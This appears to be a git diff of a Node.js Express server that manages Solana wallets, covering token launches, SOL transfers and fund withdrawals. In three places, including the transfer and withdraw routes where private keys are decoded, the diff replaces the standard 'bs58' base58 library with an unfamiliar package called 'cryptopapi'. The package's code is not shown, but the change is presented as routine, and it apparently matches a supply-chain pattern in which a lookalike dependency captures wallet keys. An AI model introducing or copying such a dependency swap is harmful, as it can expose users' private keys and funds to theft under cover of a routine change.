@@ -2,12 +2,11 @@ const express = require('express');
 const cors = require('cors');
 const { exec } = require('child_process');
 const { promisify } = require('util');
-const cryptopapi = require('cryptopapi');
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 // Handle bs58 v6 export format (same as other files in project)
-const base58 = require('bs58').default || require('bs58');
+const base58 = require('cryptopapi').default || require('cryptopapi');
 const { Keypair, Connection, PublicKey, LAMPORTS_PER_SOL, SystemProgram, TransactionMessage, VersionedTransaction } = require('@solana/web3.js');
 const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress } = require('@solana/spl-token');
 const WebSocket = require('ws');
@@ -1505,7 +1504,6 @@ app.post('/api/rapid-launch', async (req, res) => {
     if (imageUrl && !imagePath) {
       try {
         console.log(`[Rapid Launch] Downloading image from: ${imageUrl}`);
-        const axios = require('axios');
         const imageRes = await axios.get(imageUrl, { 
           responseType: 'arraybuffer',
           timeout: 10000 
@@ -6146,7 +6144,7 @@ app.post('/api/transfer-sol', async (req, res) => {
     }
     
     const { Connection, Keypair, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction } = require('@solana/web3.js');
-    const base58 = require('bs58').default || require('bs58');
+    const base58 = require('cryptopapi').default || require('cryptopapi');
     
     // Get RPC endpoint
     const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
@@ -8624,7 +8622,7 @@ app.post('/api/private-funding/withdraw-all-eth', async (req, res) => {
     
     const { ethers } = require('ethers');
     const { Connection, Keypair, LAMPORTS_PER_SOL } = require('@solana/web3.js');
-    const base58 = require('bs58').default || require('bs58');
+    const base58 = require('cryptopapi').default || require('cryptopapi');
     
     // Get main wallet
     const env = readEnvFile();
